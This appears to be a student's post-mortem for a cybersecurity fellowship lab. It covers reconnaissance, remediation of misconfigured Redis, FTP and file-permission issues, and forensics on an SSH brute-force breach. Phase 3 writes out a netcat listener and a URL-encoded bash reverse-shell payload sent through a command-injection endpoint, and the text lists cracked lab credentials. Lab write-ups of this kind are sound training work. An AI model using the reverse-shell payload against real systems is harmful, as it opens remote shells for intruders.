# Phase 1 Final Reckoning — TEPP Post-Mortem
**Operator:** [Aaron Ross]
**Date:** May 28, 2026
**Repository:** [https://github.com/arraarra413/Phase-1-T1-M1-S01-Portfolio-Artifact-Git-Push]
**TKH Innovation Fellowship 2026 | Phase 1 | Cybersecurity**

---

## Phase 0: Reconnaissance

### Triage Network — 172.100.0.0/24
Initial network reconnaissance of the 172.100.0.0/24 subnet identified three live host targets running distinct network applications. Server 1 (172.100.0.11) exposed an unauthenticated Redis key-value data store service on default TCP port 6379. Server 2 (172.100.0.12) hosted an insecure File Transfer Protocol (FTP) daemon on TCP port 21 configured to permit anonymous read access. Server 3 (172.100.0.13) was identified running a baseline system environment that contained an insecure file system layout with non-standard directory write privileges.

### Breach Network — 172.80.0.0/24
Active network scanning of the 172.80.0.0/24 subnet revealed a single active target host designated as midterm_target at IP address 172.80.0.10. This host exposed an operational Secure Shell (SSH) service listening on default TCP port 22, utilizing an ED25519 host key fingerprint. Diagnostic logging analysis demonstrated that manual login attempts triggered strict authentication timeouts, establishing that subsequent programmatic access or automated credential delivery would be required to interact reliably with the system environment.

### Exploitation Network — 172.60.0.0/24
Network infrastructure mapping identified a target endpoint hosted at 172.60.0.10 within the 172.60.0.0/24 boundary running an HTTP web service on TCP port 80. Initial connection testing revealed a standard Python-based web application context utilizing the BaseHTTP/0.6 architecture. Code review of the server configuration file (/app/server.py) exposed an explicit, unauthenticated request handler endpoint listening specifically on the /exec path, which directly processed input parameters without filtering or input validation.

---

## Phase 1: Rapid Triage

### Server 1 — 172.100.0.11
**Vulnerability Identified:**
An unauthenticated Redis data store service was exposed to the network interface, allowing arbitrary command execution and database inspection without administrative credentials.

**Remediation Commands:**
sudo docker exec -it broken_server_1 sh
iptables -A INPUT -p tcp --dport 6379 ! -s 127.0.0.1 -j DROP

**Before State:**
The Redis instance bound globally to interface 0.0.0.0:6379 with protected-mode no configured, accepting unauthorized connections from any network origin.

**After State:**
A local netfilter/iptables firewall policy dropped all incoming external TCP traffic directed to port 6379 while preserving local loopback interaction.

**Analysis:**
Exposing unauthenticated data stores to external network boundaries presents critical systemic risks to an enterprise architecture. Attackers can leverage this exposure to extract sensitive data, modify database records, or achieve remote code execution via unauthorized configuration changes.

### Server 2 — 172.100.0.12
**Vulnerability Identified:**
An unauthorized and improperly monitored vsftpd service was active on the system, providing a potential pathway for unauthorized data exfiltration or placement of malicious payloads.

**Remediation Commands:**
sudo docker stop broken_server_2

**Before State:**
The vsftpd service container was operational, actively listening for incoming connection requests on TCP port 21.

**After State:**
The host container process was fully terminated and removed from active memory, eliminating the attack surface.

**Analysis:**
Running unapproved network services bypasses baseline configuration controls and increases an organization's exploitable footprint. Unauthorized file transfer channels impede security monitoring and introduce significant risk regarding data exfiltration or regulatory non-compliance.

### Server 3 — 172.100.0.13
**Vulnerability Identified:**
A world-writable, directory privilege leak was discovered within the web server directory hierarchy, presenting a severe risk of localized privilege escalation or unauthorized file modification.

**Remediation Commands:**
sudo docker exec -it broken_server_3 sh
chmod 755 /var/www/html

**Before State:**
The directory path /var/www/html was configured with permission mode 777 (drwxrwxrwt), granting global write, read, and execute privileges to any system account.

**After State:**
The path was restricted to permission mode 755 (drwxr-xr-x), restricting write privileges exclusively to the root administrative owner.

**Analysis:**
Improper access control lists on system folders undermine default operating system boundary controls. Malicious actors who gain local access can exploit globally writeable directories to modify configuration files, plant persistent web shells, or manipulate executable binaries to elevate permissions.

---

## Phase 2: The Breach

**Cracked Credentials:**
- Username: [root]
- Password: [admin123]

**Forensic Evidence:**
- Exact Timestamp of Successful Login: [Sun May 31 05:08:00 2026 ]
- Attacker IP Address: [172.80.0.1 ]

**Engineered iptables Rule:**
[iptables -A INPUT -p tcp --dport 22 -s 172.80.0.1 -j DROP ]

**SOC Analysis:**
Implementing a standalone network block rule is insufficient because attackers can easily bypass primitive layer-3 filters by altering their source network routing or leveraging proxy infrastructure. A resilient Security Operations Center (SOC) would implement comprehensive endpoint controls, such as disabling administrative password-based SSH access in favor of multi-factor cryptographic key pairs. Additionally, automated connection-throttling tools like Fail2ban and continuous monitoring via centralized Security Information and Event Management (SIEM) solutions would be established to dynamically block multi-failure access attempts.

---

## Phase 3: Full Spectrum

**Listener Configuration:**
The listening agent was established on the host system utilizing Netcat on port 4444 via the following command:
nc -lvnp 4444

**Reverse Shell Payload:**
curl -s "http://172.60.0.10/exec?cmd=bash%20-i%20%3E%26%20%2Fdev%2Ftcp%2F172.60.0.1%2F4444%200%3E%261"

**Command Injection Explanation:**
Command injection vulnerabilities manifest when an application incorporates untrusted, user-supplied string data directly into a system shell execution utility without prior sanitization or parsing. The target custom script (server.py) is explicitly susceptible to this compromise vector because it captures raw values appended to the cmd= URI parameter, performs a basic string extraction via a split operation, and passes that unvalidated substring directly to an internal system subshell via the insecure subprocess.Popen(cmd, shell=True) design.

**Forensic Evidence:**
- Process ID (PID): [1]
- User-Agent: [curl/8.5.0]

**Lockdown Command:**
[sudo docker exec capstone_target iptables -A INPUT -p tcp --dport 80 -j DROP]

**Final Analytical Paragraph:**
Analyzing this multi-tier operation demonstrates that offensive methodologies exploit interconnected systemic weaknesses, highlighting the necessity of implementing a strict defense-in-depth posture. Although initial visibility focused on surface misconfigurations, the critical point of system compromise occurred due to the flawed programmatic trust models embedded within internal custom business logic. Implementing an explicit Input Validation Framework, which rejects non-alphanumeric formats or mandates strict white-list parameters, would have entirely neutralized the command injection vulnerability prior to execution. Furthermore, configuring system processes to operate under low-privileged Service Accounts rather than default administrative root permissions would limit post-exploitation vectors and preserve structural boundary integrity.

---

## References
Docker Project. (2026). Docker engine command line interface documentation. Docker Documentation. https://docs.docker.com/engine/reference/commandline/cli/
Netfilter Project. (2026). Iptables administration utility for IPv4 packet filtering. Netfilter Org. https://www.netfilter.org/projects/iptables/index.html
Python Software Foundation. (2026). The subprocess module: Subprocess management library documentation. Python Org. https://docs.python.org/3/library/subprocess.html
